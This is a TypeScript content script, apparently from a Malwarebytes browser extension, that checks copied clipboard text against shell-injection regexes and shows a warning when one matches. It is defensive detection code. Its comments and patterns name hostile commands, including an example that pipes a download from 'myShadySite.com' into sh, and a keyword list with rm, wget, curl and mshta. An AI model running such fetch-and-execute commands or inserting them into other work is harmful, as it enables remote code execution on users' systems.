import {MSG_ADD_ALLOW} from "@/app/scripts/app-consts.js";
import {displayShellInjectionNotification} from "@/content-scripts/content-notifications.js";
import {urlHost} from "@/utils/utils.js";
import { isExcluded } from "./tss/functions";
import { getTabId } from "./helpers";

// TODO: use sendBackgroundMessage for background messaging

// BG-779 Block sites that attempt shell injection
let isActive = true;

// command patterns found here https://www.thesecuritybuddy.com/vulnerabilities/what-is-shell-injection-or-command-injection-attack/
const shellPatterns = [
    /^.*;\s*(.|\s)*$/gm, //eg command1 ; command2
    /^.+(\s*)\|(\s*).+$/gm, // e.g curl http://myShadySite.com | sh
    /^\w+(\s*)`.+`$/gm, // e.g command1`command2` or command1 `command2`
    /^\w+(\s*)'.+'$/gm, // e.g command1'command2' or command1 'command2'
    /^.+\$\(\w+.*\)$/gm, // e.g command1$(command2)
    /^(.*\s+)*curl|ls|rm|cp|mv|touch|cd|wget|cmd|mshta(\s+.*)*$/gm,
];

const isSuspiciousText = (text) => {
    return shellPatterns.some((p) => p.test(text));
};

function allowScamsOnThisSite(): Promise<boolean> {
    return new Promise((resolve, reject) => {
        chrome.runtime.sendMessage(
            {
                type: MSG_ADD_ALLOW,
                payload: {
                    host: urlHost(window.location.href),
                },
            },
            function (response) {
                if (!response || response.error) {
                    reject(response ? response.error : null);
                } else {
                    resolve(response.success);
                }
            }
        );
    });
}

function attachEvents(dom) {
    dom.getElementById("mb-disable-shell-warning").addEventListener(
        "click",
        async () => {
            try {
                await allowScamsOnThisSite();
                isActive = false;
                // @ts-ignore
                document.getElementById("malwarebytes-root").remove();
            } catch (error) {
                console.error(
                    "CONTENT_SHELL: allowScamsOnThisSite failure",
                    error
                );
            }
        }
    );
}

function injectHtml() {
    displayShellInjectionNotification(attachEvents);
}

async function initShellInjectionProtection() {
    console.debug("CONTENT_SHELL: initShellInjectionProtection");
    const tabId = await getTabId();
    if (await isExcluded(window.location.href, tabId)) {
        console.debug(
            "CONTENT_SHELL: Page allowed. Skipping shell injection blocks"
        );
        return;
    }

    document.addEventListener("copy", async (event) => {
        const data = event.clipboardData!.getData("text/plain");
        const shouldWarn = isSuspiciousText(data);
        if (shouldWarn && isActive) {
            console.debug(
                "CONTENT_SHELL: Malicious Copy Event detected",
                event,
                data
            );
            injectHtml();
        }
    });
}

initShellInjectionProtection().then(() => {
    console.debug("CONTENT_SHELL: Shell Injection Protection initialized");
})
